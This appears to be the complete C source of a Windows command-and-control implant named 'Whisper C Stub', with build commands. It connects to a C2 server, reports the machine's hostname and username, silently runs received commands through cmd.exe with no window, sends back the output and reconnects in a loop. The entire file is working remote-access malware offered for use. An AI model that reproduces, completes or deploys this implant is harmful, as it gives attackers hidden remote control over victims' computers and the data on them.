/**
 * Whisper C Stub — Minimal agent under 50KB
 * Compile (MSVC): cl /O1 /GS- stub_c.c /link ws2_32.lib advapi32.lib
 * Compile (MinGW): gcc -Os -s -o stub.exe stub_c.c -lws2_32 -ladvapi32
 *
 * Connects to C2, receives commands, executes them via cmd.exe
 * Lightweight — no dependencies, single binary under 50KB
 */

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define C2_HOST "127.0.0.1"
#define C2_PORT 4443
#define RECONNECT_DELAY 10000

SOCKET connect_c2() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    addr.sin_addr.s_addr = inet_addr(C2_HOST);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(s); return INVALID_SOCKET;
    }
    return s;
}

int recv_all(SOCKET s, char *buf, int len) {
    int total = 0;
    while (total < len) {
        int n = recv(s, buf + total, len - total, 0);
        if (n <= 0) return 0;
        total += n;
    }
    return 1;
}

int send_all(SOCKET s, const char *buf, int len) {
    int total = 0;
    while (total < len) {
        int n = send(s, buf + total, len - total, 0);
        if (n <= 0) return 0;
        total += n;
    }
    return 1;
}

void exec_cmd(const char *cmd, char *out, int outlen) {
    HANDLE rpipe_w, rpipe_r;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    CreatePipe(&rpipe_r, &rpipe_w, &sa, 0);

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = rpipe_w;
    si.hStdError = rpipe_w;

    PROCESS_INFORMATION pi;
    char cmdbuf[4096];
    snprintf(cmdbuf, sizeof(cmdbuf), "cmd.exe /c %s", cmd);

    if (CreateProcessA(NULL, cmdbuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(rpipe_w);
    DWORD read = 0;
    ReadFile(rpipe_r, out, outlen - 1, &read, NULL);
    out[read] = 0;
    CloseHandle(rpipe_r);
    if (read == 0) strcpy(out, "(no output)");
}

void send_ok(SOCKET s, const char *type, const char *output) {
    char buf[8192];
    int len = snprintf(buf, sizeof(buf),
        "{\"type\":\"response\",\"output\":\"%s\"}", output);
    // Simplified: just send raw text for demo
    char hdr[4];
    int msglen = strlen(buf);
    hdr[0] = (msglen >> 24) & 0xFF;
    hdr[1] = (msglen >> 16) & 0xFF;
    hdr[2] = (msglen >> 8) & 0xFF;
    hdr[3] = msglen & 0xFF;
    send_all(s, hdr, 4);
    send_all(s, buf, msglen);
}

int main() {
    while (1) {
        SOCKET s = connect_c2();
        if (s == INVALID_SOCKET) {
            Sleep(RECONNECT_DELAY);
            continue;
        }

        // Send init
        char init[256];
        snprintf(init, sizeof(init), "{\"type\":\"init\",\"os\":\"Windows\",\"hostname\":\"%s\",\"user\":\"%s\"}",
            getenv("COMPUTERNAME") ?: "?", getenv("USERNAME") ?: "?");
        char hdr[4];
        int ilen = strlen(init);
        hdr[0] = (ilen >> 24) & 0xFF; hdr[1] = (ilen >> 16) & 0xFF;
        hdr[2] = (ilen >> 8) & 0xFF; hdr[3] = ilen & 0xFF;
        send_all(s, hdr, 4);
        send_all(s, init, ilen);

        // Command loop
        while (1) {
            char lenbuf[4];
            if (!recv_all(s, lenbuf, 4)) break;
            int msglen = (lenbuf[0] << 24) | (lenbuf[1] << 16) | (lenbuf[2] << 8) | lenbuf[3];
            if (msglen < 1 || msglen > 65536) break;

            char *msg = (char*)malloc(msglen + 1);
            if (!recv_all(s, msg, msglen)) { free(msg); break; }
            msg[msglen] = 0;

            if (strstr(msg, "\"type\":\"exit\"")) {
                free(msg); break;
            }
            if (strstr(msg, "\"type\":\"shell\"") || strstr(msg, "\"type\":\"cmd\"")) {
                // Extract command
                char *cmd = strstr(msg, "\"cmd\":\"");
                if (cmd) {
                    cmd += 7;
                    char *end = strchr(cmd, '"');
                    if (end) *end = 0;
                    char output[4096];
                    exec_cmd(cmd, output, sizeof(output));
                    send_ok(s, "shell", output);
                }
            }
            if (strstr(msg, "\"type\":\"ping\"")) {
                // No response needed for ping in this minimal stub
            }
            free(msg);
        }
        closesocket(s);
        Sleep(RECONNECT_DELAY);
    }
    return 0;
}
